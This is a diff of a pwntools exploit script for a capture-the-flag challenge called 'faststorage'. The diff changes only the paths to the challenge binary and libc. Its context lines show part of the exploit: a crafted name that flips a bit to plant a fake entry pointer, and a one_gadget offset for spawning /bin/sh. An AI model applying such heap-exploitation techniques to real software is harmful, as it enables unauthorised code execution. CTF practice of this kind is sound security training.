@@ -7,8 +7,8 @@ from pwn import *
 context(arch="amd64", os="linux")
 
 if not args["REMOTE"]:
-    binary = ELF("./faststorage-2.23-0ubuntu10")
-    libc = ELF("./libc-amd64-2.23-0ubuntu10.so")
+    binary = ELF("./faststorage-amd64-2.23-0ubuntu10")  # https://github.com/integeruser/bowkin
+    libc = ELF("libs/amd64/0ubuntu10/libc-2.23.so")
 
     argv = [binary.path]
     envp = {"PWD": os.getcwd()}
@@ -30,7 +30,7 @@ if not args["REMOTE"]:
         io = process(argv=argv, env=envp)
 else:
     binary = ELF("./faststorage")
-    libc = ELF("./libc-amd64-2.23-0ubuntu10.so")
+    libc = ELF("libs/amd64/0ubuntu10/libc-2.23.so")
 
     io = remote("faststorage.hackable.software", 1337)
 
@@ -273,7 +273,7 @@ a_name_to_set_the_7th_bit_at_index_60 = b"\x1b\x06\x8fM\x10\x0f\xc1\x8d\x12\x80\
 add_entry(a_name_to_set_the_7th_bit_at_index_60, "WHATEVER")
 # now, the address at `entries[-2]` is exactly a pointer to our fake entry
 
-# $ one_gadget ./libc-amd64-2.23-0ubuntu10.so
+# $ one_gadget libs/amd64/0ubuntu10/libc-2.23.so
 # . . .
 # 0x45216 execve("/bin/sh", rsp+0x30, environ)
 # constraints:
